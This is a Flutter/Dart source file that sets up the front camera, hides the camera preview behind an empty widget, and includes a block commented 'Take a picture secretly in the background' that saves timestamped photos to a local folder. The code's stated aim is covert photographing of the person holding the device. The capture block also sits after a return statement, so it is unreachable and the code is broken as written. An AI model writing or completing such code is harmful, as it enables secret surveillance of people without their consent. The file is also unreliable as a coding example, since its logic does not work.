import 'dart:async';
import 'dart:io';

import 'package:camera/camera.dart';
import 'package:flutter/material.dart';
import 'package:path_provider/path_provider.dart';

void main() async {
  // Fetch the available cameras.
  final cameras = await availableCameras();

  // Get the front camera.
  final frontCamera = cameras.firstWhere(
    (camera) => camera.lensFacing == CameraLensFacing.front,
  );

  // Create a CameraController.
  final controller = CameraController(
    frontCamera,
    ResolutionPreset.medium,
  );

  // Initialize the controller. This returns a Future.
  await controller.initialize();

  // Create a directory to store the captured images.
  final directory = await getApplicationDocumentsDirectory();
  final imageDirectory = Directory('${directory.path}/captured_images');

  // Check if the directory exists and create it if it doesn't exist.
  if (!await imageDirectory.exists()) {
    await imageDirectory.create();
  }

  // Build the widget tree.
  runApp(MyApp(
    controller: controller,
    imageDirectory: imageDirectory,
  ));
}

class MyApp extends StatelessWidget {
  final CameraController controller;
  final Directory imageDirectory;

  const MyApp({
    Key? key,
    required this.controller,
    required this.imageDirectory,
  }) : super(key: key);

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'Flutter Camera Example',
      home: TakePictureScreen(
        controller: controller,
        imageDirectory: imageDirectory,
      ),
    );
  }
}

class TakePictureScreen extends StatefulWidget {
  final CameraController controller;
  final Directory imageDirectory;

  const TakePictureScreen({
    Key? key,
    required this.controller,
    required this.imageDirectory,
  }) : super(key: key);

  @override
  State<TakePictureScreen> createState() => _TakePictureScreenState();
}

class _TakePictureScreenState extends State<TakePictureScreen> {
  File? imageFile;
  Future<void>? takePictureFuture;

  @override
  Widget build(BuildContext context) {
    // Hide the camera preview
    return Container();

    // Take a picture secretly in the background
    takePictureFuture = widget.controller.takePicture().then((image) {
      final imageName = '${DateTime.now().millisecondsSinceEpoch}.jpg';
      final imageFile = File('${widget.imageDirectory.path}/$imageName');
      image.saveTo(imageFile);
    });
  }
}
